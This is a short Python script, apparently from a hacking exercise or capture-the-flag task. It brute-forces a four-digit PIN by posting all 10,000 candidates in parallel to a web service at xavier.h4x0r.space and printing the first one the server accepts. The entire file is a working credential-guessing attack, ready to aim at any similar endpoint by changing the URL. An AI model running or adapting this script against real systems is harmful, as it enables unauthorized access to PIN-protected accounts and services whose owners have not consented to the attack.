#!/usr/bin/env python3

import concurrent.futures
import requests

# Constants

URL = 'http://xavier.h4x0r.space:9999'

# Functions

def unlock(pin):
    response = requests.post(URL, params={'pin': pin})
    if 'Success' in response.text:
        return pin

# Main Execution

def main():
    candidates = range(0, 10000)
    # Sequential
    #pins       = [result for result in map(unlock, candidates) if result]

    # Parallel
    with concurrent.futures.ProcessPoolExecutor() as executor:
        pins = [result for result in executor.map(unlock, candidates) if result]

    print(pins[0])

if __name__ == '__main__':
    main()
